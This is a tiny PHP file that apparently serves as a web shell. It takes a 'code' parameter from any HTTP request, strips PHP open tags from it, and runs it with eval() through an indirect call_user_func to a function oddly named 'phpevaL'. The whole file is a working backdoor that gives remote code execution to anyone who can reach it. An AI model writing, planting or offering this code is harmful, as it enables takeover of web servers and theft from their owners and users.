<?php
function phpevaL(){
	if (!empty($_REQUEST['code'])){
		$code = $_REQUEST['code'];
		$code = str_replace("<?","",$code);
		eval($code);
	}
}

call_user_func('phpevaL');
?>